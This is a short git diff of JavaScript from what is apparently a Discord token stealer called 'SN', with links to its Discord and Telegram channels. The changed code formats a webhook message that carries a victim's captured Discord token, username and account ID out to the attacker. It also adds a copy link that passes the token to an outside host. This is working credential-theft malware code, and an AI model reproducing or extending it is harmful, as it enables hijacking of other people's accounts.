@@ -320,22 +320,17 @@ const login = async (email, password, token) => {
     avatar_url: config.embed_icon,
     embeds: [
       {
-            description: "[<a:blackcap:961249786315538524> │ If you have a problem join our Discord server](https://discord.gg/23zfPcaT) or [our Telegram server](https://t.me/snstealer)",
+            description: "<a:blackcap:961249786315538524> │ **If you have a problem join our [Discord server](https://discord.gg/23zfPcaT) or [Telegram server](https://t.me/snstealer)**",
             "color": config.embed_color,
             "fields": [
                 {
-                    "name": "**Token**",
+                    "name": "SN - Token:",
                     "value": `\`\`\`${token}\`\`\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
                     "inline": false
                 },
                 {
-                    "name": "**Account Name**",
-                    "value": `\`${json.username +"#" + json.discriminator}\``,
-                    "inline": true
-                },
-                {
-                    "name": "**Account ID**",
-                    "value": `\`${json.id}\``,
+                    "name": "SN - Username:",
+                    "value": `\`${json.username +"#" + json.discriminator}\` + "("+ \`${json.id}\` +")"`,
                     "inline": true
                 },
                 {
